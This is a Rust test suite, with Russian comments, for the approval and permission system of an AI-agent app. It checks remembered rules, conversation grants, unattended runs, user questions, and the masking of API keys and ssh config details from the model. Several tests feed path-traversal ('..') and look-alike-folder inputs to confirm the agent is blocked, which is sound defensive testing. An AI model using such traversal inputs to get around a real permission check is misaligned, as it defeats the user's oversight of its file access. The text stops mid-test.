//! Ответы на карточки, которые помнят, вопросы с вариантами и формой, список «Нужен ты».

use crate::common;

use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use axum::body::Bytes;
use axum::extract::State;
use axum::response::{IntoResponse, Response};
use axum::routing::post;
use axum::{Json, Router};
use common::Crew;
use serde_json::{json, Value};

/// Модель по сценарию: следующий ответ на каждый запрос.
#[derive(Clone, Default)]
struct Fake {
    script: Arc<Mutex<Vec<Value>>>,
    requests: Arc<Mutex<Vec<Value>>>,
}

fn say(text: &str) -> Value {
    json!({ "role": "assistant", "content": text })
}

fn tool(name: &str, args: Value) -> Value {
    let id = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos();
    json!({ "role": "assistant", "content": "", "tool_calls": [{ "id": format!("c{id}"), "type": "function", "function": { "name": name, "arguments": args.to_string() } }] })
}

async fn completions(State(fake): State<Fake>, body: Bytes) -> Response {
    let request: Value = serde_json::from_slice(&body).unwrap();
    // Служебные вызовы программы (эпизоды и извлечение памяти) идут без инструментов: им
    // сценарий бота не отдаём, иначе фоновый эпизод съест следующий шаг хода.
    if request.get("tools").is_none() {
        return Json(json!({ "choices": [{ "message": say("{\"ops\": []}") }] })).into_response();
    }
    fake.requests.lock().unwrap().push(request);
    let message = {
        let mut script = fake.script.lock().unwrap();
        if script.is_empty() { say("готово") } else { script.remove(0) }
    };
    Json(json!({ "choices": [{ "message": message }] })).into_response()
}

async fn serve(fake: Fake) -> u16 {
    let router = Router::new().route("/v1/chat/completions", post(completions)).with_state(fake);
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(listener, router).await.unwrap() });
    port
}

async fn setup(name: &str, env: &[(&str, &str)]) -> (Crew, Fake, String) {
    let fake = Fake::default();
    let port = serve(fake.clone()).await;
    let crew = Crew::start_with_env(name, env).await;
    crew.ok("PUT", "/api/settings", Some(json!({ "driver": "api", "baseUrl": format!("http://127.0.0.1:{port}/v1"), "apiKey": "k" }))).await;
    crew.listen().await;
    let state = crew.ok("GET", "/api/state", None).await;
    let bot = state["bots"][0]["id"].as_str().unwrap().to_string();
    (crew, fake, bot)
}

/// Папка вне папки бота: запись туда спрашивается.
/// Не во временной папке системы: она внутри `AppData`, туда запомнить разрешение нельзя.
fn outside(name: &str) -> PathBuf {
    let dir = PathBuf::from(env!("CARGO_TARGET_TMPDIR")).join(format!("deloist-ap-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(dir.join("a")).unwrap();
    std::fs::create_dir_all(dir.join("a-evil")).unwrap();
    dir
}

fn write(path: &std::path::Path) -> Value {
    tool("write_file", json!({ "path": path.display().to_string(), "content": "x" }))
}

/// Один ход: модель вызывает инструмент и потом отвечает. Возвращает карточку, если была.
async fn turn(crew: &Crew, fake: &Fake, bot: &str, call: Value, answer: Option<&str>) -> Option<Value> {
    *fake.script.lock().unwrap() = vec![call, say("готово")];
    crew.clear_events();
    crew.say(bot, "сделай").await;
    let first = crew.wait_event("карточка или конец хода", |e| e["type"] == "approval" || e["type"] == "turn_end").await;
    if first["type"] == "turn_end" {
        return None;
    }
    let id = first["id"].as_str().unwrap();
    crew.ok("POST", &format!("/api/approvals/{id}"), Some(json!({ "answer": answer.unwrap_or("deny") }))).await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;
    Some(first)
}

async fn activity(crew: &Crew, bot: &str) -> Vec<Value> {
    crew.ok("GET", &format!("/api/bots/{bot}/activity"), None).await["entries"].as_array().cloned().unwrap()
}

async fn needs(crew: &Crew) -> Value {
    crew.ok("GET", "/api/needs", None).await
}

#[tokio::test(flavor = "multi_thread")]
async fn always_here_covers_the_same_bot_tool_and_folder_only() {
    let (crew, fake, bot) = setup("ap-always", &[]).await;
    let dir = outside("always");

    let card = turn(&crew, &fake, &bot, write(&dir.join("a").join("1.txt")), Some("always")).await.expect("первая запись спрашивает");
    assert_eq!(card["grantable"], true, "{card}");
    let tail = std::path::Path::new(dir.file_name().unwrap()).join("a").display().to_string().to_lowercase();
    assert!(card["scope"]["place"].as_str().unwrap().to_lowercase().ends_with(&tail), "{card}");
    let rules = crew.ok("GET", "/api/permissions", None).await["rules"].as_array().cloned().unwrap();
    assert_eq!(rules.len(), 1, "{rules:?}");

    // Та же папка — без карточки, и в журнале видно правило.
    assert!(turn(&crew, &fake, &bot, write(&dir.join("a").join("2.txt")), None).await.is_none());
    assert!(dir.join("a").join("2.txt").exists());
    let log = activity(&crew, &bot).await;
    assert_eq!(log[0]["how"], "rule", "{log:?}");
    assert_eq!(log[0]["by"], rules[0]["id"], "{log:?}");
    assert!(log[0]["text"].as_str().unwrap().contains("разрешено правилом „всегда здесь“"), "{log:?}");

    // Вложенная папка — уже другое место.
    std::fs::create_dir_all(dir.join("a").join("sub")).unwrap();
    assert!(turn(&crew, &fake, &bot, write(&dir.join("a").join("sub").join("2.txt")), None).await.is_some());
    assert!(!dir.join("a").join("sub").join("2.txt").exists());

    // Соседняя папка с похожим именем — снова карточка.
    assert!(turn(&crew, &fake, &bot, write(&dir.join("a-evil").join("3.txt")), None).await.is_some());
    assert!(!dir.join("a-evil").join("3.txt").exists());

    // Другой бот правилом первого не пользуется.
    let other = crew.ok("POST", "/api/bots", Some(json!({ "name": "Второй", "role": "р" }))).await["bot"]["id"].as_str().unwrap().to_string();
    assert!(turn(&crew, &fake, &other, write(&dir.join("a").join("4.txt")), None).await.is_some(), "правило чужого бота");

    // Правило снято — снова спрашивает.
    let rule = rules[0]["id"].as_str().unwrap();
    crew.ok("DELETE", &format!("/api/permissions/rules/{rule}"), None).await;
    assert!(turn(&crew, &fake, &bot, write(&dir.join("a").join("5.txt")), None).await.is_some());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn auto_mode_asks_for_files_of_this_computer_but_not_for_its_own_folder() {
    let (crew, fake, bot) = setup("ap-auto-files", &[]).await;
    set_mode(&crew, &bot, "auto").await;
    let dir = outside("auto-files");

    // Файл этого компьютера вне папок бота — карточка «Этот компьютер» и в «Свободе действий».
    let cards = turn_calls(&crew, &fake, &bot, vec![write(&dir.join("a").join("out.txt"))]).await;
    assert_eq!(cards.len(), 1, "{cards:?}");
    assert_eq!(cards[0]["allowLabel"], "Этот компьютер", "{cards:?}");
    assert_eq!(cards[0]["tool"], "write_file");
    assert!(!dir.join("a").join("out.txt").exists(), "записано без разрешения");
    // Разрешили папку «всегда» — дальше пишется без карточки.
    turn(&crew, &fake, &bot, write(&dir.join("a").join("out.txt")), Some("always")).await.expect("карточка на запись");
    let cards = turn_calls(&crew, &fake, &bot, vec![write(&dir.join("a").join("out.txt"))]).await;
    assert!(cards.is_empty(), "{cards:?}");
    assert_eq!(std::fs::read_to_string(&dir.join("a").join("out.txt")).unwrap(), "x");

    // Соседняя папка — снова карточка.
    let cards = turn_calls(&crew, &fake, &bot, vec![write(&dir.join("a-evil").join("out.txt"))]).await;
    assert_eq!(cards.len(), 1, "{cards:?}");
    assert!(!dir.join("a-evil").join("out.txt").exists());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn an_ordinary_always_does_not_open_a_risky_kind() {
    let (crew, fake, bot) = setup("ap-kind", &[]).await;
    let dir = outside("kind");
    let at = dir.join("a").display().to_string();

    let add = format!("git -C \"{at}\" add .");
    let card = turn(&crew, &fake, &bot, tool("run_command", json!({ "command": add })), Some("always")).await.unwrap();
    assert_eq!(card["scope"]["place"], add.as_str(), "место — вся строка: {card}");
    assert_eq!(card["scope"]["kind"], "", "{card}");
    assert!(turn(&crew, &fake, &bot, tool("run_command", json!({ "command": add })), None).await.is_none(), "та же строка — по правилу");
    let commit = turn(&crew, &fake, &bot, tool("run_command", json!({ "command": format!("git -C \"{at}\" commit -m day") })), None).await;
    assert!(commit.is_some(), "другая строка git — уже другое место");

    // Та же команда, но публикация: правило для обычного действия её не открывает.
    let push = turn(&crew, &fake, &bot, tool("run_command", json!({ "command": format!("git -C \"{at}\" push") })), None).await;
    let push = push.expect("публикация спрашивает");
    assert_eq!(push["scope"]["kind"], "publish", "{push}");

    // Строку с подстановкой запомнить нельзя.
    let opaque = turn(&crew, &fake, &bot, tool("run_command", json!({ "command": format!("git -C \"{at}\" add %CD%") })), Some("always")).await.unwrap();
    assert_eq!(opaque["grantable"], false, "{opaque}");
    let rules = crew.ok("GET", "/api/permissions", None).await["rules"].as_array().cloned().unwrap();
    assert_eq!(rules.len(), 1, "«всегда» на незапоминаемой карточке не создаёт правила: {rules:?}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_conversation_grant_ends_on_turn_off_and_on_chat_clear() {
    let (crew, fake, bot) = setup("ap-conv", &[]).await;
    let dir = outside("conv");
    let file = |n: &str| dir.join("a").join(n);

    let card = turn(&crew, &fake, &bot, write(&file("1.txt")), Some("conversation")).await.unwrap();
    assert_eq!(card["conversation"], true, "{card}");
    let grants = crew.ok("GET", &format!("/api/permissions/grants?conv=bot:{bot}"), None).await["grants"].as_array().cloned().unwrap();
    assert_eq!(grants.len(), 1, "{grants:?}");
    assert!(turn(&crew, &fake, &bot, write(&file("2.txt")), None).await.is_none(), "в том же разговоре не спрашивает");
    assert_eq!(activity(&crew, &bot).await[0]["how"], "conversation");

    // «Выключить» над полем ввода.
    crew.ok("DELETE", &format!("/api/permissions/grants/{}", grants[0]["id"].as_str().unwrap()), None).await;
    assert!(turn(&crew, &fake, &bot, write(&file("3.txt")), Some("conversation")).await.is_some(), "после выключения снова спрашивает");

    // Очистка чата заканчивает разговор.
    assert!(turn(&crew, &fake, &bot, write(&file("4.txt")), None).await.is_none());
    crew.ok("POST", &format!("/api/bots/{bot}/clear"), None).await;
    let left = crew.ok("GET", "/api/permissions/grants", None).await["grants"].as_array().cloned().unwrap();
    assert!(left.is_empty(), "{left:?}");
    assert!(turn(&crew, &fake, &bot, write(&file("5.txt")), None).await.is_some(), "после очистки снова спрашивает");
    let _ = std::fs::remove_dir_all(&dir);
}

async fn add_routine(crew: &Crew, bot: &str) -> String {
    let body = json!({ "botId": bot, "title": "Ночью", "prompt": "запиши отчёт", "everyMinutes": 60 });
    let (status, data) = crew.send("POST", "/api/workflows", Some(body)).await;
    assert_eq!(status, 201, "{data}");
    data["process"]["id"].as_str().unwrap().to_string()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_rule_works_at_night_and_a_conversation_grant_does_not() {
    let (crew, fake, bot) = setup("ap-night", &[("CREW_TEST_UNATTENDED_WAIT_MS", "300")]).await;
    let dir = outside("night");
    turn(&crew, &fake, &bot, write(&dir.join("a").join("day.txt")), Some("always")).await.unwrap();
    turn(&crew, &fake, &bot, write(&dir.join("a-evil").join("day.txt")), Some("conversation")).await.unwrap();
    let routine = add_routine(&crew, &bot).await;

    *fake.script.lock().unwrap() = vec![write(&dir.join("a").join("night.txt")), say("записал")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/workflows/{routine}/run"), Some(json!({ "attended": false }))).await;
    let entry = crew.wait_event("журнал", |e| e["type"] == "journal").await["entry"].clone();
    assert_eq!(entry["status"], "ok", "{entry}");
    assert!(crew.find_event(|e| e["type"] == "approval").is_none(), "правило должно сработать без карточки");
    assert!(dir.join("a").join("night.txt").exists());
    let log = activity(&crew, &bot).await;
    assert_eq!(log[0]["how"], "rule", "{log:?}");
    assert!(log[0]["label"].as_str().unwrap().contains("night.txt"), "{log:?}");

    // Разрешение разговора ночью не действует: карточка и, как раньше, «на утро».
    *fake.script.lock().unwrap() = vec![write(&dir.join("a-evil").join("night.txt")), say("не смог")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/workflows/{routine}/run"), Some(json!({ "attended": false }))).await;
    let entry = crew.wait_event("журнал", |e| e["type"] == "journal").await["entry"].clone();
    assert_eq!(entry["status"], "needs", "{entry}");
    assert!(!dir.join("a-evil").join("night.txt").exists());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn ask_user_with_choices_and_with_a_form_round_trips() {
    let (crew, fake, bot) = setup("ap-ask", &[]).await;
    *fake.script.lock().unwrap() = vec![
        tool("ask_user", json!({ "question": "Какой отчёт?", "choices": ["Продажи", "Остатки"] })),
        tool("ask_user", json!({ "question": "Параметры", "form": [
            { "name": "count", "label": "Сколько", "type": "number" },
            { "name": "day", "label": "День", "type": "date" },
            { "name": "shop", "label": "Магазин", "type": "choice", "options": ["Ozon", "WB"] },
            { "name": "note", "label": "Заметка", "type": "text" },
        ] })),
        say("готово"),
    ];
    crew.say(&bot, "сделай отчёт").await;

    let q = crew.wait_event("вопрос с вариантами", |e| e["type"] == "question").await;
    assert_eq!(q["choices"], json!(["Продажи", "Остатки"]), "{q}");
    assert_eq!(needs(&crew).await["count"], 1);
    let id = q["id"].as_str().unwrap().to_string();
    crew.ok("POST", &format!("/api/questions/{id}"), Some(json!({ "answer": "Остатки" }))).await;
    let result = crew.wait_event("ответ", |e| e["type"] == "tool_update" && e["status"] == "ok").await;
    assert!(result["result"].as_str().unwrap().contains("Ответ человека: Остатки"), "{result}");

    let form = crew.wait_event("форма", |e| e["type"] == "question" && e["id"] != id.as_str()).await;
    assert_eq!(form["form"].as_array().unwrap().len(), 4, "{form}");
    let fid = form["id"].as_str().unwrap().to_string();
    let (status, _) = crew.send("POST", &format!("/api/questions/{fid}"), Some(json!({ "values": { "count": "много" } }))).await;
    assert_eq!(status, 400, "число проверяется");
    let (status, _) = crew.send("POST", &format!("/api/questions/{fid}"), Some(json!({ "values": { "count": "3", "shop": "Яндекс" } }))).await;
    assert_eq!(status, 400, "вариант проверяется");
    let values = json!({ "count": "3,5", "day": "2026-11-12", "shop": "WB", "note": "срочно" });
    crew.ok("POST", &format!("/api/questions/{fid}"), Some(json!({ "values": values }))).await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;
    let results: Vec<Value> = crew.events.lock().unwrap().iter().filter(|e| e["type"] == "tool_update").cloned().collect();
    let text = results.last().unwrap()["result"].as_str().unwrap().to_string();
    let json_part = text.strip_prefix("Ответ человека (JSON): ").expect(&text);
    let parsed: Value = serde_json::from_str(json_part).unwrap();
    assert_eq!(parsed, json!({ "count": 3.5, "day": "2026-11-12", "shop": "WB", "note": "срочно" }));
    assert_eq!(needs(&crew).await["count"], 0, "ответ убирает вопрос из «Нужен ты»");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_question_waits_across_a_restart_and_the_answer_comes_as_a_message() {
    let (mut crew, fake, bot) = setup("ap-restart", &[("CREW_TEST_UNATTENDED_WAIT_MS", "300")]).await;
    let routine = add_routine(&crew, &bot).await;
    *fake.script.lock().unwrap() = vec![tool("ask_user", json!({ "question": "Какой склад?", "choices": ["Коледино", "Казань"] })), say("жду ответа")];
    crew.ok("POST", &format!("/api/workflows/{routine}/run"), Some(json!({ "attended": false }))).await;
    crew.wait_event("журнал", |e| e["type"] == "journal").await;
    let list = needs(&crew).await;
    assert_eq!(list["count"], 1, "{list}");
    assert_eq!(list["items"][0]["kind"], "question");

    crew.keep_data();
    let dir = crew.data_dir.clone();
    drop(crew);
    let crew = Crew::start_at(dir, &[]).await;
    crew.listen().await;
    let list = needs(&crew).await;
    assert_eq!(list["count"], 1, "вопрос пережил перезапуск: {list}");
    let pending = crew.ok("GET", &format!("/api/bots/{bot}/pending"), None).await;
    assert_eq!(pending["pending"].as_array().unwrap().len(), 1, "{pending}");

    let id = list["items"][0]["id"].as_str().unwrap();
    crew.ok("POST", &format!("/api/questions/{id}"), Some(json!({ "answer": "Казань" }))).await;
    crew.wait_event("новый ход", |e| e["type"] == "turn_end").await;
    let last = fake.requests.lock().unwrap().last().cloned().unwrap();
    let asked = last["messages"].as_array().unwrap().iter().any(|m| m["content"].as_str().is_some_and(|c| c.contains("[ответ на вопрос бота]") && c.contains("«Какой склад?»") && c.contains("Ответ человека: Казань")));
    assert!(asked, "ответ пришёл боту сообщением: {last}");
    assert_eq!(needs(&crew).await["count"], 0);
}

#[tokio::test(flavor = "multi_thread")]
async fn needs_you_counts_cards_across_bots_and_clears() {
    let (crew, fake, bot) = setup("ap-needs", &[]).await;
    let dir = outside("needs");
    *fake.script.lock().unwrap() = vec![write(&dir.join("a").join("1.txt")), say("готово")];
    crew.say(&bot, "запиши").await;
    let card = crew.wait_event("карточка", |e| e["type"] == "approval").await;
    let list = needs(&crew).await;
    assert_eq!(list["count"], 1, "{list}");
    assert_eq!(list["items"][0]["kind"], "approval");
    assert_eq!(list["items"][0]["botId"], bot.as_str());
    assert!(list["items"][0]["botName"].is_string(), "{list}");
    crew.ok("POST", &format!("/api/approvals/{}", card["id"].as_str().unwrap()), Some(json!({ "answer": "once" }))).await;
    crew.wait_event("конец хода", |e| e["type"] == "turn_end").await;
    assert_eq!(needs(&crew).await["count"], 0);
    let log = activity(&crew, &bot).await;
    assert_eq!(log[0]["how"], "once", "ответ человека тоже в журнале: {log:?}");

    // «Стоп» снимает и вопросы бота.
    *fake.script.lock().unwrap() = vec![tool("ask_user", json!({ "question": "Что дальше?" }))];
    crew.clear_events();
    crew.say(&bot, "спроси").await;
    crew.wait_event("вопрос", |e| e["type"] == "question").await;
    assert_eq!(needs(&crew).await["count"], 1);
    crew.ok("POST", &format!("/api/bots/{bot}/stop"), None).await;
    crew.wait_event("вопрос закрыт", |e| e["type"] == "question_closed").await;
    assert_eq!(needs(&crew).await["count"], 0);
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn deleting_a_routine_is_never_remembered_and_schedule_tools_ask_at_night() {
    let (crew, fake, bot) = setup("ap-routines", &[("CREW_TEST_UNATTENDED_WAIT_MS", "300")]).await;
    let routine = add_routine(&crew, &bot).await;

    // Удаление рутины: только «один раз» или «запретить»; «всегда» правила не создаёт.
    let card = turn(&crew, &fake, &bot, tool("delete_workflow", json!({ "workflow_id": routine })), Some("always")).await.expect("удаление спрашивает");
    assert_eq!(card["grantable"], false, "{card}");
    assert_eq!(card["conversation"], false, "{card}");
    assert_eq!(card["always"], false, "{card}");
    let rules = crew.ok("GET", "/api/permissions", None).await["rules"].as_array().cloned().unwrap();
    assert!(rules.is_empty(), "{rules:?}");

    // Днём «всегда» на создание рутины работает.
    let create = || tool("create_workflow", json!({ "title": "Сводка", "prompt": "пришли сводку", "every_minutes": 60 }));
    let card = turn(&crew, &fake, &bot, create(), Some("always")).await.expect("создание спрашивает");
    assert_eq!(card["grantable"], true, "{card}");
    assert!(turn(&crew, &fake, &bot, create(), None).await.is_none(), "днём — по правилу");

    // Ход без человека правилом не пользуется: карточка и «на утро».
    let night = add_routine(&crew, &bot).await;
    let by_rule = |log: &[Value]| log.iter().filter(|e| e["how"] == "rule").count();
    let before = by_rule(&activity(&crew, &bot).await);
    *fake.script.lock().unwrap() = vec![create(), say("не смог")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/workflows/{night}/run"), Some(json!({ "attended": false }))).await;
    let entry = crew.wait_event("журнал", |e| e["type"] == "journal").await["entry"].clone();
    assert_eq!(entry["status"], "needs", "{entry}");
    assert_eq!(by_rule(&activity(&crew, &bot).await), before, "ночью правило не сработало");
    if let Some(card) = crew.find_event(|e| e["type"] == "approval") {
        assert_eq!(card["grantable"], false, "{card}");
    }
}

/// Вопрос бота в группе, сохранённый на диске, как после перезапуска.
fn plant_question(dir: &std::path::Path, bot: &str, room: &str, question: &str) -> String {
    let id = "ap_planted";
    let list = json!([{ "id": id, "botId": bot, "conv": format!("room:{room}"), "question": question, "choices": [], "form": [], "at": 1 }]);
    std::fs::write(dir.join("questions.json"), list.to_string()).unwrap();
    id.to_string()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_late_answer_in_a_room_goes_to_the_bot_that_asked_not_its_namesake() {
    let (mut crew, fake, _first) = setup("ap-room-answer", &[]).await;
    let new_bot = |name: &'static str| crew.ok("POST", "/api/bots", Some(json!({ "name": name, "role": "р" })));
    let lead = new_bot("Иван Петров").await["bot"]["id"].as_str().unwrap().to_string();
    let asker = new_bot("Иван Сидоров").await["bot"]["id"].as_str().unwrap().to_string();
    let room = crew.ok("POST", "/api/rooms", Some(json!({ "name": "Склад", "botIds": [lead, asker], "lead": lead, "mode": "lead" }))).await["room"]["id"].as_str().unwrap().to_string();

    crew.keep_data();
    let dir = crew.data_dir.clone();
    drop(crew);
    let id = plant_question(&dir, &asker, &room, "Какой склад?");
    crew = Crew::start_at(dir, &[]).await;
    crew.listen().await;

    *fake.script.lock().unwrap() = vec![say("принял")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/questions/{id}"), Some(json!({ "answer": "Казань" }))).await;
    let start = crew.wait_event("ход группы", |e| e["type"] == "room_turn_start").await;
    assert_eq!(start["botId"], asker.as_str(), "ответ достался тёзке: {start}");
    crew.wait_event("конец хода группы", |e| e["type"] == "room_turn_end").await;
    let last = fake.requests.lock().unwrap().last().cloned().unwrap();
    let delivered = last["messages"].as_array().unwrap().iter().any(|m| m["content"].as_str().is_some_and(|c| c.contains("Ответ человека: Казань")));
    assert!(delivered, "{last}");
    let _ = &mut crew;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_late_answer_for_a_busy_bot_in_a_room_waits_in_its_queue() {
    let (mut crew, fake, _first) = setup("ap-room-busy", &[]).await;
    let lead = crew.ok("POST", "/api/bots", Some(json!({ "name": "Иван Петров", "role": "р" }))).await["bot"]["id"].as_str().unwrap().to_string();
    let asker = crew.ok("POST", "/api/bots", Some(json!({ "name": "Иван Сидоров", "role": "р" }))).await["bot"]["id"].as_str().unwrap().to_string();
    let room = crew.ok("POST", "/api/rooms", Some(json!({ "name": "Склад", "botIds": [lead, asker], "lead": lead, "mode": "lead" }))).await["room"]["id"].as_str().unwrap().to_string();
    crew.keep_data();
    let dir = crew.data_dir.clone();
    drop(crew);
    let id = plant_question(&dir, &asker, &room, "Какой склад?");
    crew = Crew::start_at(dir, &[]).await;
    crew.listen().await;

    // Спросивший занят: его ход ждёт карточку разрешения.
    let out = outside("room-busy");
    *fake.script.lock().unwrap() = vec![write(&out.join("a").join("x.txt")), say("готово")];
    crew.clear_events();
    crew.say(&asker, "запиши").await;
    let card = crew.wait_event("карточка", |e| e["type"] == "approval").await;

    crew.ok("POST", &format!("/api/questions/{id}"), Some(json!({ "answer": "Казань" }))).await;
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    assert!(crew.find_event(|e| e["type"] == "room_turn_start").is_none(), "ответ не должен уйти другому боту группы");
    let queue = crew.ok("GET", &format!("/api/bots/{asker}/queue"), None).await;
    let items = queue["items"].as_array().cloned().unwrap_or_default();
    assert!(items.iter().any(|i| i["text"].as_str().is_some_and(|t| t.contains("Ответ человека: Казань"))), "ответ в очереди спросившего: {queue}");

    crew.ok("POST", &format!("/api/approvals/{}", card["id"].as_str().unwrap()), Some(json!({ "answer": "deny" }))).await;
    let _ = std::fs::remove_dir_all(&out);
}

// --- ключи проекта: карточка `secret` и {{secret:…}} --------------------------

const KEY_VALUE: &str = "0f0e0d0c-1111-2222-3333-444455556666";

#[tokio::test(flavor = "multi_thread")]
async fn project_keys_need_a_secret_card_and_never_reach_the_model() {
    let (crew, fake, bot) = setup("ap-keys", &[("CREW_TEST_UNATTENDED_WAIT_MS", "300")]).await;
    let dir = outside("keys");
    let env_file = dir.join("a").join(".env");
    std::fs::write(&env_file, format!("# Ozon\nOZON_CLIENT_ID=131999\nOZON_SELLER_API_KEY={KEY_VALUE}\n")).unwrap();
    let read = || tool("read_file", json!({ "path": env_file.display().to_string() }));

    // Один раз: карточка своего вида, без «всегда»; модели — ссылки вместо значений.
    let card = turn(&crew, &fake, &bot, read(), Some("once")).await.expect("файл с ключами спрашивает");
    assert_eq!(card["scope"]["kind"], "secret", "{card}");
    assert_eq!(card["always"], false, "{card}");
    assert!(card["title"].as_str().unwrap().contains("Бот хочет прочитать файл с ключами: .env"), "{card}");
    let result = crew.find_event(|e| e["type"] == "tool_update").unwrap()["result"].as_str().unwrap().to_string();
    assert!(result.contains("OZON_SELLER_API_KEY={{secret:OZON_SELLER_API_KEY}}"), "{result}");
    assert!(!result.contains(KEY_VALUE), "{result}");

    // «Один раз» не запоминается; «всегда» здесь значит «в этом разговоре», правила нет.
    let card = turn(&crew, &fake, &bot, read(), Some("always")).await.expect("один раз — снова карточка");
    assert_eq!(card["scope"]["kind"], "secret");
    let rules = crew.ok("GET", "/api/permissions", None).await["rules"].as_array().cloned().unwrap();
    assert!(rules.is_empty(), "ключи нельзя разрешить навсегда: {rules:?}");
    assert!(turn(&crew, &fake, &bot, read(), None).await.is_none(), "в этом разговоре уже разрешено");

    // Ключ уходит процессу, а в чат — только ссылка.
    let echo = tool("run_command", json!({ "command": "echo {{secret:OZON_SELLER_API_KEY}}> key.txt & type key.txt" }));
    assert!(turn(&crew, &fake, &bot, echo, None).await.is_none(), "своя папка, ключ уже сохранён");
    let ws = crew.data_dir.join("workspaces").join(&bot).join("key.txt");
    assert!(std::fs::read_to_string(&ws).unwrap().contains(KEY_VALUE), "процесс не получил значение");
    let result = crew.find_event(|e| e["type"] == "tool_update").unwrap()["result"].as_str().unwrap().to_string();
    assert!(result.contains("{{secret:OZON_SELLER_API_KEY}}") && !result.contains(KEY_VALUE), "{result}");
    let missing = tool("run_command", json!({ "command": "echo {{secret:NOPE}}" }));
    turn(&crew, &fake, &bot, missing, None).await;
    let result = crew.find_event(|e| e["type"] == "tool_update").unwrap();
    assert_eq!(result["status"], "error", "{result}");
    assert!(result["result"].as_str().unwrap().contains("нет ключа NOPE"), "{result}");

    // Без человека ключи не читаются: разрешение разговора ночью не действует, ответа нет — отказ.
    let routine = add_routine(&crew, &bot).await;
    *fake.script.lock().unwrap() = vec![read(), say("не смог")];
    crew.clear_events();
    crew.ok("POST", &format!("/api/workflows/{routine}/run"), Some(json!({ "attended": false }))).await;
    let entry = crew.wait_event("журнал", |e| e["type"] == "journal").await["entry"].clone();
    assert_eq!(entry["status"], "needs", "{entry}");
    let update = crew.find_event(|e| e["type"] == "tool_update").unwrap();
    assert_ne!(update["status"], "ok", "{update}");

    // Значение не попало ни в запросы к модели, ни в файлы чата и памяти.
    let sent = serde_json::to_string(&*fake.requests.lock().unwrap()).unwrap();
    assert!(!sent.contains(KEY_VALUE), "значение ушло модели");
    for sub in ["threads", "memory"] {
        for entry in walk(&crew.data_dir.join(sub)) {
            let text = std::fs::read_to_string(&entry).unwrap_or_default();
            assert!(!text.contains(KEY_VALUE), "значение в {}", entry.display());
        }
    }
    let _ = std::fs::remove_dir_all(&dir);
}

fn walk(dir: &std::path::Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir).into_iter().flatten().flatten() {
        let path = entry.path();
        if path.is_dir() {
            out.extend(walk(&path));
        } else {
            out.push(path);
        }
    }
    out
}

#[tokio::test(flavor = "multi_thread")]
async fn ssh_config_shows_host_names_only() {
    let (crew, fake, bot) = setup("ap-ssh-config", &[]).await;
    let dir = outside("sshcfg");
    std::fs::create_dir_all(dir.join(".ssh")).unwrap();
    std::fs::write(dir.join(".ssh").join("config"), "Host myserver\n  HostName 203.0.113.10\n  IdentityFile C:\\k\\vps\n").unwrap();
    let call = tool("read_file", json!({ "path": dir.join(".ssh").join("config").display().to_string() }));
    assert!(turn(&crew, &fake, &bot, call, None).await.is_none(), "имена хостов читаются без карточки");
    let update = crew.find_event(|e| e["type"] == "tool_update").unwrap();
    let text = update["result"].as_str().unwrap();
    assert!(update["status"] == "ok" && text.contains("myserver"), "{update}");
    assert!(!text.contains("203.0") && !text.contains("vps"), "{text}");
    let _ = std::fs::remove_dir_all(&dir);
}

// --- общие папки команды: свои для бота в любом разговоре, проект с программой внутри ---------------------

fn plain(path: &std::path::Path) -> String {
    std::fs::canonicalize(path).unwrap().display().to_string().trim_start_matches(r"\\?\").to_string()
}

/// Папка файлов бота в команде: общая `workspaces/team_<комната>`, а не личная `workspaces/<бот>`.
fn team_workspace(crew: &Crew, room: &str) -> std::path::PathBuf {
    crew.data_dir.join("workspaces").join(format!("team_{room}"))
}

async fn make_team(crew: &Crew, members: &[&str], folder: &std::path::Path) -> String {
    let room = crew.ok("POST", "/api/rooms", Some(json!({ "name": "Редакция", "botIds": members }))).await["room"]["id"].as_str().unwrap().to_string();
    crew.ok("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "folders": [plain(folder)] }))).await;
    room
}

#[tokio::test(flavor = "multi_thread")]
async fn a_team_folder_is_own_space_for_a_member_in_any_chat_and_for_nobody_else() {
    let (crew, fake, bot) = setup("ap-team-own", &[]).await;
    let dir = outside("team-own");
    let folder = dir.join("a");
    let other = crew.ok("POST", "/api/bots", Some(json!({ "name": "Чужой", "role": "р" }))).await["bot"]["id"].as_str().unwrap().to_string();
    let room = make_team(&crew, &[bot.as_str()], &folder).await;

    // Участник в личном чате пишет в папку команды без карточки.
    assert!(turn(&crew, &fake, &bot, write(&folder.join("1.txt")), None).await.is_none(), "участнику карточка не нужна");
    assert!(folder.join("1.txt").exists());
    // Не участник, соседняя папка и обход через «..» — карточка.
    assert!(turn(&crew, &fake, &other, write(&folder.join("2.txt")), None).await.is_some(), "не участник");
    assert!(turn(&crew, &fake, &bot, write(&dir.join("a-evil").join("3.txt")), None).await.is_some(), "соседняя папка");
    assert!(turn(&crew, &fake, &bot, write(&folder.join("..").join("a-evil").join("4.txt")), None).await.is_some(), "обход через ..");
    assert!(!dir.join("a-evil").join("3.txt").exists() && !dir.join("a-evil").join("4.txt").exists());

    // Папку убрали из команды: снова спрашивает.
